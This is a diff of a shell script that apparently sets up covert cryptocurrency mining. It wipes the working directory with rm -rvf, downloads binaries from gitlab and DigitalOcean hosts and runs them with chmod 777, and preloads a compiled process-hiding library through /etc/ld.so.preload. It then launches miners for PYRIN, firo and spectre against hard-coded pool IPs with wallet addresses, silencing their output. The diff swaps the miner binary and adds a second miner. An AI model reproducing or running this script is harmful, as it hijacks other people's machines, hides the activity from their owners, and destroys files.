@@ -1,4 +1,5 @@
 rm -rvf * && mkdir d && cd d
+
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
@@ -13,9 +14,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/gm3.43
 
-chmod 777 lol1.81
+chmod 777 gm3.43
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -57,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 -a PYRIN -p 167.172.24.221:443 -u pyrin:qp2acr4a4hlqh4fvxlpz8d9q4kml8afrz668wt3ycmsdd8p06ml22ut24gpjz.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl 
+./graftcp/graftcp ./gm3.43 -a firo -s 192.241.132.122:80 -u a3zog3xmAgbcdxmq8qP36gELD2gpkqTGjL.$(shuf -n 1 -i 1-3000)-Bismillah & wget https://majza.nyc3.digitaloceanspaces.com/Tnn0.4.0 && chmod 777 Tnn0.4.0 && ./Tnn0.4.0 --daemon-address 157.230.239.11 --port 443 --worker-name $(shuf -n 1 -i 1-999)-Bismillah --spectre --wallet spectre:qqq4er4vlhygdzcuc4clyqceyv66qn6mvwl0j6dxcgukzgw36y03v4dzryrhl > /dev/null 2>&1
